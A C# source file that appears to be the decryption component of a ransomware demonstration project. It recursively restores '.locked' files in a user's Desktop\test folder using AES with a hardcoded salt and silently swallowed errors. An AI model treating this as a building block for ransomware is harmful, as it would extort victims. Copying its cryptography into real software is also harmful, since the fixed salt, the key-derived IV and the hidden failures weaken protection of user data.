using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace RansomwareDemo.ransomware
{
    class DecryptionUtil
    {

        string userName = Environment.UserName;
        string userDir = "C:\\Users\\";

        public byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;

            try
            {                
                // Set your salt here, change it to meet your flavor:
                // The salt bytes must be at least 8 bytes.
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {

                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                            cs.Close();
                        }
                        decryptedBytes = ms.ToArray();
                    }
                }
            }
            catch (Exception ex)
            {
                //Do nothing
            }
            return decryptedBytes;
        }

        public void DecryptFile(string file, string password)
        {

            byte[] bytesToBeDecrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesDecrypted = AES_Decrypt(bytesToBeDecrypted, passwordBytes);

            try
            {
                File.WriteAllBytes(file, bytesDecrypted);
                string extension = System.IO.Path.GetExtension(file);
                string result = file.Substring(0, file.Length - extension.Length);
                System.IO.File.Move(file, result);
            }
            catch (Exception ex)
            {
                // Do nothing
            }
        }

        public void DecryptDirectory(string location, string password)
        {
            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++)
            {
                string extension = Path.GetExtension(files[i]);
                if (extension == ".locked")
                {
                    DecryptFile(files[i], password);
                }
            }
            for (int i = 0; i < childDirectories.Length; i++)
            {
                DecryptDirectory(childDirectories[i], password);
            }

        }

        public void startAction(string password)
        {
            string path = "\\Desktop\\test";
            string fullpath = userDir + userName + path;
            DecryptDirectory(fullpath, password);
        }
    }
}
